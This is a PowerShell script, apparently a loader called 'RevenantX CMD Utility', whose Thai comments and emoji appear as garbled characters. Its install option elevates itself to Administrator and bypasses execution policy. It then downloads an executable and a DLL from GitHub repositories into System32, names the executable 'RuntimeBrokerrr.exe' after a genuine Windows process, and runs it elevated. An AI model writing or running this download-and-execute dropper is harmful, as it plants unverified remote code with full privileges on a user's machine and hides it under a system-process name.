# ==========================================================
# üíÄ RevenantX CMD Utility | Version: 29/10/2025
# ==========================================================

# -----------------------------
# Menu Selection
# -----------------------------
Write-Host ""
Write-Host "             WELCOME TO REVENANTX CMD            " -ForegroundColor Cyan
Write-Host "              ¬© 2025 | PIGGY PROJECT               " -ForegroundColor Gray
Write-Host ""
Write-Host " [1] Install & Run" -ForegroundColor Green
Write-Host " [2] Clean" -ForegroundColor Yellow
Write-Host ""
$choice = Read-Host ">>> Enter your choice (1/2)"

# -----------------------------
# Check for Administrator Rights
# -----------------------------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
    Write-Host "`n[‚öô] Restarting with Administrator privileges..." -ForegroundColor Cyan
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# -----------------------------
# Define Paths & Variables
# -----------------------------
$system32Path = "$env:windir\System32"
$exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
$dllDestination = Join-Path $system32Path "Guna.UI2.dll"

$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/HEE.exe"
$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"

# -----------------------------
# Install & Run Mode
# -----------------------------
if ($choice -eq "1") {

    # ======================================
    # üîê KEY AUTH SYSTEM (‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÉ‡∏´‡∏°‡πà‡∏ï‡∏£‡∏á‡∏ô‡∏µ‡πâ)
    # ======================================
    $validKey = "MY-SECRET-KEY-123"   # <-- ‡∏Ñ‡∏∏‡∏ì‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÅ‡∏Å‡πâ‡πÑ‡∏î‡πâ
    Write-Host ""
    Write-Host "üîê ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡πÉ‡∏™‡πà‡∏Ñ‡∏µ‡∏¢‡πå‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á" -ForegroundColor Cyan

    $userKey = Read-Host ">>> Enter Key"

    if ($userKey -ne $validKey) {
        Write-Host "`n[‚úñ] Key ‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á! ‡∏¢‡∏Å‡πÄ‡∏•‡∏¥‡∏Å Install" -ForegroundColor Red
        exit
    }

    Write-Host "[‚úî] Key ‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á! ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á..." -ForegroundColor Green
    Start-Sleep -Seconds 1
    # ======================================


    Write-Host "`n[üöÄ] Starting Installation..." -ForegroundColor Cyan
    Start-Sleep -Seconds 1

    # Download DLL
    Write-Host "[‚Üì] Downloading Guna.UI2.dll..."
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -UseBasicParsing
        Write-Host "[‚úî] Guna.UI2.dll download completed." -ForegroundColor Green
    } catch {
        Write-Host "[‚úñ] Guna.UI2.dll download failed: $_" -ForegroundColor Red
        exit
    }

    # Download EXE
    Write-Host "[‚Üì] Downloading main executable..."
    try {
        $tempFile = Join-Path $env:TEMP "revenantx_temp.exe"
        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing
        Move-Item -Path $tempFile -Destination $exeDestination -Force
        Write-Host "[‚úî] Executable download completed." -ForegroundColor Green
    } catch {
        Write-Host "[‚úñ] Executable download failed: $_" -ForegroundColor Red
        exit
    }

    # Run program
    Write-Host "[‚ö°] Launching program..." -ForegroundColor Cyan
    try {
        Start-Process -FilePath $exeDestination -Verb RunAs
        Write-Host "[‚úî] Program started successfully." -ForegroundColor Green
    } catch {
        Write-Host "[‚úñ] Failed to start program: $_" -ForegroundColor Red
    }

    Write-Host "`n[‚úÖ] Installation completed successfully!" -ForegroundColor Green
}

# -----------------------------
# Clean Mode
# -----------------------------
elseif ($choice -eq "2") {
    Write-Host "`n[üßπ] Cleaning up installation..." -ForegroundColor Yellow

    Write-Host "[‚öô] Stopping RuntimeBrokerrr.exe process..."
    try {
        Stop-Process -Name "RuntimeBrokerrr" -Force -ErrorAction SilentlyContinue
        Write-Host "[‚úî] Process stopped." -ForegroundColor Green
    } catch {
        Write-Host "[‚ö†] No running process found or failed to stop." -ForegroundColor DarkYellow
    }

    if (Test-Path $exeDestination) { 
        Remove-Item $exeDestination -Force 
        Write-Host "[üóë] Removed executable: RuntimeBrokerrr.exe" -ForegroundColor Green
    }
    if (Test-Path $dllDestination) { 
        Remove-Item $dllDestination -Force 
        Write-Host "[üóë] Removed DLL: Guna.UI2.dll" -ForegroundColor Green
    }

    Write-Host "`n[‚úÖ] Cleanup completed successfully!" -ForegroundColor Green
}

# -----------------------------
# Invalid Choice
# -----------------------------
else {
    Write-Host "`n[‚úñ] Invalid selection. Please choose 1 or 2." -ForegroundColor Red
}

# ==========================================================
# End of Script | RevenantX Project ¬© 2025
# ==========================================================
